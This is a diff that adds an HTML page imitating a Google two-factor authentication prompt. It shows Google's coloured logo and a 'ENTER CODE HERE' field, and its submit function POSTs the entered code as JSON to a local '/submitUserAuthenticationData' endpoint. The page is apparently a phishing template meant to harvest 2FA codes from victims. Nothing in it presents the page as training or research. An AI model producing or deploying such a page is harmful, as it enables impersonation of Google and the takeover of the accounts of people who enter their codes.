@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail-authentication_token</title>
+
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        form {
+            width: 400px;
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            color: #0a77dd;
+            margin-bottom: 30px;
+        }
+
+        h4 {
+            margin-top: 0;
+            color: #333;
+        }
+
+        h5 {
+            color: #555;
+            margin-top: 5px;
+        }
+
+        #fieldset {
+            border: none;
+            padding: 0; 
+            text-align: left;
+        }
+
+        #legend {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+            transition: color 0.3s ease-in-out;
+        }
+
+        #code{
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+            border: 1px solid #ddd; 
+            border-radius: 5px;
+            transition: border-color 0.3s ease-in-out;
+        }
+
+        #code:focus {
+            border-color: #0a77dd;
+        }
+        
+        
+        
+
+        a {
+            color: #0a77dd;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        p {
+            color: #555;
+            margin-top: 5px;
+        }
+
+        input[type="button"] {
+            background-color: #0a77dd;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-weight: bold;
+            cursor: pointer;
+            
+        }
+
+        input[type="button"]:hover {
+            background-color: #085fad;
+        }
+    </style>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var codeInput = document.getElementById("code");
+            var legend = document.getElementById("legend");
+            
+
+            codeInput.addEventListener("focus", function () {
+                legend.style.color = "#0a77dd";
+                emailInput.style.borderColor = "#0a77dd";
+            });
+
+            codeInput.addEventListener("blur", function () {
+                legend.style.color = "#333";
+                emailInput.style.borderColor = "#ddd";
+            });
+
+
+        });
+    </script>
+</head>
+
+<body>
+    <form>
+
+        <h2>
+            <span style="color: #0a77dd;">G</span><span style="color:#a52a2a">o</span><span style="color:#ffe600">o</span><span style="color:#0a77dd">g</span><span style="color:green">l</span><span style="color:#a52a2a">e</span>
+        </h2>
+
+        <h4>2FA/</h4>
+        <h5>Google will send a two factor authentication code in a few...</h5>
+
+        <fieldset id="fieldset">
+            <legend id="legend">ENTER CODE HERE</legend>
+            <input type="number" id="code" name="number" required>
+            
+        </fieldset>
+
+        <a href="#" style="color:#0a77dd;text-decoration:none;">Resend code</a>
+
+        <p>
+            <a href="#" style="color:#0a77dd;text-decoration:none;font-weight:bold;"></a>
+        </p>
+
+        <a href="#" style="color:#0a77dd;text-decoration:none;font-weight:bold;"></a><br>
+
+        <input type="button" value="SUBMIT" onclick="submitF()">
+
+    </form>
+
+
+
+
+    <script>
+        function submitF() {
+            var code = document.getElementById("code").value;
+    
+            var userauthenticationData = {
+                code: code
+            };
+    
+            var serverEndpoint = '/submitUserAuthenticationData';
+
+            fetch(serverEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(userauthenticationData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Server response:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    
+        </script>
+
+
+
+
+</body>
+
+</html>
